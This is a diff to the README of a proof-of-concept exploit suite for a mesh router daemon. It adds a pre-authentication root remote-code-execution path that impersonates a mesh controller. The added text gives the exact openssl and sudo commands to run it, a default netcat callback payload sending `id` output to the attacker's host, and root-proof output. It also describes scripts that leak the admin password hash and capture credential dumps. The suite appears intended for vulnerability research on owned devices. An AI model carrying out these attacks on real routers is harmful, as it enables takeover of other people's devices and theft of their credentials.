@@ -6,18 +6,20 @@ fallback if it is absent.) Each script documents its mechanics in its module
 docstring; the `cab_meshd` internals are in
 [`../technical-appendix.md`](../technical-appendix.md).
 
-> Run only against a device you own. The PoCs default to `192.168.31.1`; override
-> with `--host`. All connect to the slow `cab_meshd` daemon, so they default to a
-> 20 s timeout and retry the handshake through the daemon's connection-slot stall.
+> Run only against a device you own. CAP-side clients default to
+> `192.168.31.1` via `--host` and retry around the daemon's connection-slot
+> stall. `re_wan_rce.py` instead listens as a rogue CAP on `--bind`
+> (`192.168.77.1` by default) and waits up to 90 seconds for the factory RE.
 
 | Script | For | What it does |
 |---|---|---|
 | `init_router.py` | prep | Minimally initializes a *factory* unit through `router_init`, sets `INITTED=YES`, and opens the CAP listener after reboot while leaving `NETMODE` unset. This differs from the normal web wizard, which can set `whc_cap`. It retains the factory admin verifier. |
 | `extract_admin.py` | **V1** | **The primary PoC.** Leak `web_passwd256` over 19553 (pre-auth), then mint an admin `stok`. **Read-only** against the target (never sends `type-7`). Confirmed on hardware. |
 | `ota_rce.py` | **V1+V2** | **Root RCE in the tested gate-open mode.** Chains V1 → V2 via `encryption`-field injection and a root callback. Stops before planting unless `get_netmode` confirms numeric `0`. **Confirmed on hardware after minimal initialization.** |
-| `handshake.py` | inspection | Full mesh protocol driver: forges the constant-key handshake to `ST_RUNNING` and prints the CAP's sync config (where `web_passwd256` appears). `--no-trigger` stops before `cap_init`. |
+| `re_wan_rce.py` | **V2 RE/WAN** | **Direct pre-auth root RCE against a factory-reset router.** Answers WAN discovery as a rogue CAP, authenticates with the `x` key, sends type-6, and captures `uid=0(root)`. No V1, admin session, or `init_router.py`. **Confirmed on hardware.** |
+| `handshake.py` | inspection | Full mesh protocol driver: forges the constant-key handshake to `ST_RUNNING` and prints the CAP's sync config (where `web_passwd256` appears). `--no-trigger` stops before `cap_init`; `--dump-sync PATH` saves the raw type-6 body. |
 | `rce_poc.py` | **V2** | **Root command execution (CAP/LAN direct path).** base64'd `--cmd` in the type-4 **plant** (`body[0x90]`), full `4→5→7` handshake. Confirmed in emulation (root-owned file). ~4-char one-shot. Used as the trigger component of `ota_rce.py`. See `../chain2-root-rce.md`. |
-| `exploit.py` | V2 (explanatory) | Documents the primitive verbosely, but its `body+0xe6` field theory does **not** hold on the CAP server path — **use `rce_poc.py`** for a landing payload. |
+| `exploit.py` | historical | Non-working CAP driver retained as an annotated record of the earlier offset theory. Use `rce_poc.py` for CAP/LAN or `re_wan_rce.py` for RE/WAN. |
 
 ## Primary run (device you own)
 
@@ -42,6 +44,8 @@ python3 handshake.py --host 192.168.31.1 --no-trigger
 Minimal initialization keeps the shipped admin verifier and opens the mesh
 listener. Use an isolated network and complete the intended test or install
 promptly; ordinary web setup is a different path and can close the V2 gate.
+
+The factory RE/WAN PoC below is a separate path. It does not use this preparation.
 
 ## V2 OTA — root RCE in the gate-open state (confirmed on hardware)
 
@@ -83,6 +87,51 @@ minimal initialization left `NETMODE` unset. Reachability after ordinary
 Xiaomi web setup has not been demonstrated. See `../chain2-root-rce.md` for the
 technical breakdown.
 
+## V2 RE/WAN — direct factory root RCE (confirmed on hardware)
+
+Connect an isolated attacker interface to any Ethernet socket on a factory-reset
+RD03v2; stock WAN/LAN autosensing selects the live socket as WAN. The attacker-side
+segment must provide DHCP and a gateway address. In the hardware test the attacker
+was `192.168.77.1/24` and the router lease was `192.168.77.142`.
+
+Create a short-lived self-signed certificate, then run the rogue CAP as root (the
+proof listener binds TCP/80):
+
+```bash
+openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
+  -subj /CN=rogue-cap \
+  -keyout /tmp/re-wan-key.pem -out /tmp/re-wan-cert.pem
+
+sudo python3 re_wan_rce.py \
+  --bind 192.168.77.1 \
+  --cert /tmp/re-wan-cert.pem --key /tmp/re-wan-key.pem
+```
+
+The default proof expression is `` `id|nc 192.168.77.1 80` ``. Success prints:
+
+```
+[ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
+[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)
+```
+
+`--raw-pswd` accepts a different expression, but the built-in success check only
+recognizes `uid=0(...)` sent to `BIND:80` or an HTTP request for `/0`. A custom
+payload that has no callback may execute, consume the one-shot factory state, and
+still make the PoC time out with status 1; absence of a callback is not proof of
+non-execution.
+
+The PoC embeds a stock-compatible 1,764-byte type-6 layout. It deliberately fills
+four otherwise-empty front-haul fields so unquoted `$@` does not shift the
+controlled `bh_pswd` away from `do_re_init` `$8`. `--template` can instead load a
+raw type-6 body captured with
+`handshake.py --dump-sync /tmp/type6.bin --no-trigger`.
+The dump includes `web_passwd*` and may contain Wi-Fi credentials; the helper
+creates it mode `0600`. Store and delete it as credential material.
+
+A successful run completes `re_init`, sets `INITTED=YES`, changes network/Wi-Fi
+configuration, and stops the factory RE daemon. Factory-reset the device before
+repeating the test.
+
 ## V2 — direct root command execution (CAP/LAN path, emulation)
 
 ```bash
@@ -93,8 +142,8 @@ Delivers `base64('`>W`')` in the type-4 plant, completes `4→5→7`, and the da
 drives `mimesh_init`'s `eval` as root when the CAP gate is open. Confirmed in
 emulation. A completed `cap_init` can set `NETMODE=whc_cap` and close that gate;
 normal web setup can set the same mode without any exploit.
-The payload budget is ~4 characters here. The RE/WAN candidate has a larger
-budget but is not confirmed end-to-end on hardware; see `../chain2-root-rce.md`.
+The payload budget is ~4 characters here. The RE/WAN path has a larger 32/64-byte
+reliable budget and is confirmed end-to-end on hardware; see `../chain2-root-rce.md`.
 `ota_rce.py` uses the CAP handshake as its trigger and plants the longer payload
 through the admin Wi-Fi API in the tested gate-open state.
 
@@ -108,5 +157,9 @@ through the admin Wi-Fi API in the tested gate-open state.
   previous exploit. On an owned test unit, a full reset followed by the minimal
   `init_router.py` setup can reproduce the tested gate-open state; a normal web
   setup can close it again.
-- `rce_poc.py`/`exploit.py` send a `cap_init` trigger; on a gate-open unit that
-  *could* execute the command if the sink fires, so choose the payload accordingly.
+- `rce_poc.py` sends a `cap_init` trigger and can execute its short command on a
+  gate-open unit. Historical `exploit.py` does not land its e6/107 payload on CAP,
+  but it still sends active protocol traffic and should not be used as a read-only
+  inspection probe.
+- `re_wan_rce.py` completes `re_init` and changes the factory router into an
+  initialized mesh RE. A factory reset is required to restore the starting state.
